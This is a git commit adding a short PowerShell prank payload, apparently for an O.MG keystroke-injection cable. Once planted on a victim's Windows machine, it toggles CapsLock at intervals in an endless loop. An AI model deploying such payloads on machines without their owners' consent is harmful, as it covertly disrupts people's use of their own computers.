99dcc3394d55720c6a24449ed7244ed7c2c26485
atomic <75549184+atomiczsec@users.noreply.github.com>
2022-11-21 16:49:45 -0500

    Add files via upload

---
+++ OMG/payloads/cApS-Troll/a.ps1
@@ -0,0 +1,8 @@
+﻿while (1){
+Start-Sleep -Second 45
+$wsh = New-Object -ComObject WScript.Shell
+$wsh.SendKeys('{CAPSLOCK}')
+Start-Sleep -Second 150
+$wsh = New-Object -ComObject WScript.Shell
+$wsh.SendKeys('{CAPSLOCK}')
+} 
